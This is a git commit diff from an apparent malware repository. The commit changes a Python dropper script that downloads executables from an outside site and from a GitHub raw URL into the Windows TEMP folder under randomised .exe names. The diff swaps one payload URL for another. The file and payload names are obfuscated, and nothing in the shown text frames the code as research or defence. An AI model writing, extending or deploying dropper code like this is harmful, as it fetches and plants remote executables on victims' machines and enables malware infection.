e4d108848a10e957559defa2c34c17db7babe406
chaotic3185 <benjamin.durand123@proton.me>
2025-04-12 23:00:23 +0200

    Update anfaehfbshbfhbqsfhbqfb.py

--- anfaehfbshbfhbqsfhbqfb.py
+++ anfaehfbshbfhbqsfhbqfb.py
@@ -4,7 +4,7 @@ dropper_url1 = "https://rdmfile.eu/install/GcNTp4S8BJZH"
 temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
 dropped_path1 = os.path.join(temp_dir, "fkdvsdngfsndfjnsfjnsjf.exe")
 
-dropper_url2 = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/OGLoader.exe"
+dropper_url2 = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/sdqsdazdazeazeasdqs.exe"
 dropped_path2 = os.path.join(temp_dir, "sjfnsjdnfjsnf.exe")
 
 with open(dropped_path1, "wb") as f:
